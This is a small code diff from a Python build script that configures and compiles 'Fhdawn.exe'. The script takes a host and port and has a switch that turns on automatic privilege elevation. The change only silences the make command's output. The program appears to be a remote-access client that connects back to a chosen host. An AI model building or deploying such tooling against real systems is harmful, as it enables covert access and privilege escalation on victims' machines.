@@ -27,7 +27,7 @@ def Build(host, port):
     if(elevate):
         inplace_change("fhdawn.h", "static BOOL auto_elevate = FALSE;", "static BOOL auto_elevate = TRUE;")
 
-    subprocess.call(["make"], stderr=subprocess.STDOUT, stdout=None)
+    subprocess.call(["make"], stderr=subprocess.STDOUT, stdout=subprocess.DEVNULL)
     if(os.path.isfile("Fhdawn.exe")):
         print("[+] Built : {x}".format(x = os.path.abspath("Fhdawn.exe")))
     else:
